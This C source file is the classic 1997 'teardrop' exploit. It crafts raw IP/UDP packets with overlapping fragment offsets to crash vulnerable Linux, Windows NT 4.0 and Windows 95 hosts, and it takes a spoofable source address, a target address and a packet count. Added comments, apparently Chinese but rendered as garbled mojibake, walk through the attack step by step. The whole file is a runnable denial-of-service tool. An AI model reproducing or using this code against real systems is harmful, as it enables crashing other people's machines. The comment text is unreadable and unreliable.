/*
 *  Copyright (c) 1997 route|daemon9   11.3.97
 *
 *  Linux/NT/95 Overlap frag bug exploit
 *
 *  Exploits the overlapping IP fragment bug present in all Linux kernels and
 *  NT 4.0 / Windows 95 (others?)
 *
 *  Based off of:   flip.c by klepto
 *  Compiles on:    Linux, *BSD*
 *
 *  gcc -O2 teardrop.c -o teardrop
 *      OR
 *  gcc -O2 teardrop.c -o teardrop -DSTRANGE_BSD_BYTE_ORDERING_THING
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>

#ifdef STRANGE_BSD_BYTE_ORDERING_THING
                        /* OpenBSD < 2.1, all FreeBSD and netBSD, BSDi < 3.0 */
#define FIX(n)  (n)
#else                   /* OpenBSD 2.1, all Linux */
#define FIX(n)  htons(n)
#endif  /* STRANGE_BSD_BYTE_ORDERING_THING */

#define IP_MF   0x2000  /* IP��ƫ����*/
#define IPH     0x14    /* IPͷ����С */
#define UDPH    0x8     /* UDPͷ����С*/
#define PADDING 0x1c    /* ��һ������������� */
#define MAGIC   0x3     /* Ƭ�γ��ȣ�Ӧ���� 2 or 3 */
#define COUNT   0x1     /* ����Ŀ  ��˵linux 1���Ǳ���  ��������Ҫ���  ���������ڼ����û�õ���.
                         */

						 
void usage(u_char *);
u_long name_resolve(u_char *);
u_short in_cksum(u_short *, int);
void send_frags(int, u_long, u_long, u_short, u_short);


/*
Teardrop�Ĺ���ԭ���ǣ�������A���ܺ���B����һЩ��ƬIP���ģ����ҹ��⽫��13λ��Ƭƫ�ơ��ֶ����óɴ����ֵ(�ȿ�����һ��Ƭ�����ص���Ҳ�ɴ�)��
B��������ֺ����ص�ƫ�Ƶ�α���Ƭ����ʱ���ᵼ��ϵͳ������
���Գ���ʵ������������Ŀ����������count��ipUDP���İ�������ÿ�����ֳ�������Ƭ���з��ͣ���������Ƭ�������ó��ص��ģ�
����Ŀ�������յ�����Ƭ�ξͻ��������--����ϵͳ��������
*/
int main(int argc, char **argv)
{
    int one = 1, count = 0, i, rip_sock;
    u_long  src_ip = 0, dst_ip = 0;
    u_short src_prt = 0, dst_prt = 0;
    struct in_addr addr;  // ip��ַ�ṹ��

    fprintf(stderr, "teardrop   route|daemon9\n\n");

	//��SOCK_RAW   �½�һ��ԭʼ�׽���
    if((rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
        perror("raw socket");
        exit(1);
    }
	//�����׽���ѡ��  ����������ϵͳ����IPУ��͡�
    if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one)) < 0)
    {
        perror("IP_HDRINCL");
        exit(1);
    }

	// �������� ��ʾ���ʹ�÷���  %s src_ip dst_ip [ -s src_prt ] [ -t dst_prt ] [ -n how_many ]
    if (argc < 3) usage(argv[0]);
	
	// �ж������ip��ַ�Ƿ���Ч  
    if (!(src_ip = name_resolve(argv[1])) || !(dst_ip = name_resolve(argv[2])))
    {
        fprintf(stderr, "What the hell kind of IP address is that?\n");
        exit(1);
    }
	
	// �����������  �鿴��û�п�ѡ���� ����  -sԴ�˿�  -tĿ��˿�  -n������Ŀ ���û�п�ѡ�˿ھͲ���Ĭ�ϵ�
    while ((i = getopt(argc, argv, "s:t:n:")) != EOF)
    {// ������ѡ����
        switch (i)
        {
            case 's':               /* source port (should be emphemeral) */
                src_prt = (u_short)atoi(optarg);
                break;
            case 't':               /* dest port (DNS, anyone?) */
                dst_prt = (u_short)atoi(optarg);
                break;
            case 'n':               /* number to send */
                count   = atoi(optarg);
                break;
            default :
                usage(argv[0]);
                break;              /* NOTREACHED */
        }
    }

	// ��ʼ�������
    srandom((unsigned)(time((time_t)0)));
	
	// ���û��ָ����ѡ�Ķ˿ڲ���  ���������һ��
    if (!src_prt) src_prt = (random() % 0xffff);
    if (!dst_prt) dst_prt = (random() % 0xffff);
    if (!count)   count   = COUNT;

    fprintf(stderr, "Death on flaxen wings:\n");
    addr.s_addr = src_ip;  // ��ʼ��Դip��ַ���������������� û�õ�����
    fprintf(stderr, "From: %15s.%5d\n", inet_ntoa(addr), src_prt);
    addr.s_addr = dst_ip;   //��ʼ��Ŀ�ģ���ַ
    fprintf(stderr, "  To: %15s.%5d\n", inet_ntoa(addr), dst_prt);
    fprintf(stderr, " Amt: %5d\n", count);
    fprintf(stderr, "[ ");

	// ����count����
    for (i = 0; i < count; i++)
    {
		// ��Ƭ����
        send_frags(rip_sock, src_ip, dst_ip, src_prt, dst_prt);
        fprintf(stderr, "b00m ");
        usleep(500);
    }
    fprintf(stderr, "]\n");
    return (0);
}

// ������ǽ�ip�����з�Ƭ���� Դip Ŀ��ip  Դ�˿� Ŀ��˿�
void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt,
                u_short dst_prt)
{
    u_char *packet = NULL, *p_ptr = NULL;   /* ��ָ�� */
    u_char byte;                            /* һ���ֽ� */
    struct sockaddr_in sin;                 /* socketЭ��ṹ��*/
	
	// ��ʼ��socket��Э����  �˿�  ��Ŀ�ĵ�ַ
    sin.sin_family      = AF_INET;
    sin.sin_port        = src_prt;
    sin.sin_addr.s_addr = dst_ip;

	 // ������ڴ� ����ʼ��Ϊ��
    packet = (u_char *)malloc(IPH + UDPH + PADDING);
    p_ptr  = packet;
    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);

	// �����ip���ĳ�ʼ�����죬������������һ�� ��������ipͷ���ṹ����г�ʼ�� ����ֱ�����ڴ��г�ʼ��  ֱ�Ӹ���ip���ṹ��Э����г�ʼ��  
	//4Ϊ ipv4�汾  5Ϊͷ����
    byte = 0x45;                       
    memcpy(p_ptr, &byte, sizeof(u_char));  // ��ʼ��ipͷ�� ��version��ihl
    p_ptr += 2;                         /* ������������tos */
    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING);    /* ���ܳ��� tot_len*/
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(242);   /* ���ݰ���ʶid */
    p_ptr += 2;
    *((u_short *)p_ptr) |= FIX(IP_MF);  /* ��ƫ�������� frag */
    p_ptr += 2;
    *((u_short *)p_ptr) = 0x40;         /* ip������ʱ��  TTL */
    byte = IPPROTO_UDP;
    memcpy(p_ptr + 1, &byte, sizeof(u_char));   //ip�����²�Э�� protocol ������UDP
    p_ptr += 4;                         /* ipУ��� ���ں��Լ���� �������� */
    *((u_long *)p_ptr) = src_ip;        /* IP����Դ��ַ */
    p_ptr += 4;
    *((u_long *)p_ptr) = dst_ip;        /* IP����Ŀ�ĵ�ַ*/
    p_ptr += 4;
    *((u_short *)p_ptr) = htons(src_prt);       /* UDPЭ���Դ�˿� source port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(dst_prt);       /* UDPЭ���Ŀ�� destination port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(8 + PADDING);   /* UDP �����ܳ���total length */

	// ��ʼ���ʹ˰�
    if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&sin,sizeof(struct sockaddr)) == -1)
    {
        perror("\nsendto");
        free(packet);  // ����ʧ�ܾ��ͷŰ��ڴ� ���˳�
        exit(1);
    }
	 
	 /*
		���￪ʼ���÷ֶ�ƫ����   ���������ô�� �������շ����ܵ��� �����鲻�˰� �����  �������� ����
	 */
	 
    p_ptr = &packet[2];         /* ����ͷ�� ��ip��ƫ�������ڴ�λ�� */
    *((u_short *)p_ptr) = FIX(IPH + MAGIC + 1);   // ��������ipƫ����
    p_ptr += 4;                 /* ��ƫ�������ô��� ��һ�� */
    *((u_short *)p_ptr) = FIX(MAGIC);
	
	// ���·���һ��ƫ�ư�  �������η��͵İ� �������ǲ���֪�İ��� �����ip��
    if (sendto(sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *)&sin,
                sizeof(struct sockaddr)) == -1)
    {
        perror("\nsendto");
        free(packet);
        exit(1);
    }
    free(packet);
}

// �ж������ip��ַ�Ƿ���Ч
u_long name_resolve(u_char *host_name)
{
    struct in_addr addr;
    struct hostent *host_ent;

    if ((addr.s_addr = inet_addr(host_name)) == -1)
    {
        if (!(host_ent = gethostbyname(host_name))) return (0);
        bcopy(host_ent->h_addr, (char *)&addr.s_addr, host_ent->h_length);
    }
    return (addr.s_addr);
}

// ʹ�÷���
void usage(u_char *name)
{
    fprintf(stderr,"%s src_ip dst_ip [ -s src_prt ] [ -t dst_prt ] [ -n how_many ]\n",name);
    exit(0);
}
